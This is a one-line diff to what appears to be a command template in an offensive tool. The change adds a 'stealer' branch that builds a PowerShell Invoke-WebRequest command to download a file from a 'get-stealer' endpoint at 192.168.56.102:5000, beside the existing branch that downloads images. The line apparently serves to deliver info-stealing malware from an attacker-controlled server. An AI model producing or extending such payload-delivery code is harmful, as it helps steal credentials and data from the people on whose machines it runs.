@@ -1,1 +1,1 @@
-{% if image_name %}Invoke-WebRequest -Uri "http://127.0.0.1:8080/{{image_name}}" -OutFile {% endif %}
+{% if stealer %}Invoke-WebRequest -Uri "192.168.56.102:5000/get-stealer" -OutFile {% else %}Invoke-WebRequest -Uri "192.168.56.102:5000/get-image/{{image_name}}" -OutFile {% endif %}
